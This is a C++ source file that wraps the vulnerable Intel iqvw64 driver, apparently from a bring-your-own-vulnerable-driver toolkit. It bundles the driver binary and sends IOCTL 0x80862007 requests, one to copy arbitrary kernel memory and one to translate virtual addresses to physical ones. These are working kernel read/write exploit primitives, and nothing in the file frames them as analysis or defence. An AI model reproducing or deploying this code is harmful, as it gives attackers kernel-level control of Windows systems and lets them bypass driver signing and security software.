#include "iqvw64_driver.hpp"

#include <print>
#include <vulnerables/iqvw64_data.hpp>

Iqvw64Driver::Iqvw64Driver(std::string_view symbLink)
    : BasicVulnDriver(std::move(symbLink))
{
}

const std::vector<uint8_t>& Iqvw64Driver::GetData() const
{
    return iqvw64_data;
}

bool Iqvw64Driver::KeMemMove(uintptr_t dist, uintptr_t src, std::size_t size)
{
    struct CopyMemoryRequest {
        char option;
        char pad0[0xF];
        uintptr_t src;
        uintptr_t dist;
        std::size_t size;
    };

    CopyMemoryRequest request = { 0 };
    request.option = 0x33;
    request.src = src;
    request.dist = dist;
    request.size = size;

    return SendIoRequest<CopyMemoryRequest>(0x80862007, request);
}

uintptr_t Iqvw64Driver::KeGetPhysicalAddress(uintptr_t vaddr)
{
    struct Virtual2PhysicalRequest {
        char option;
        char pad0[0xF];
        uintptr_t physicalAddr;
        uintptr_t virtualAddr;
    };

    Virtual2PhysicalRequest request = { 0 };
    request.option = 0x25;
    request.virtualAddr = vaddr;

    if (!SendIoRequest<Virtual2PhysicalRequest>(0x80862007, request)) {
        std::println("[-] Failed to translate vAddr to physical");
        return 0;
    }

    return request.physicalAddr;
}
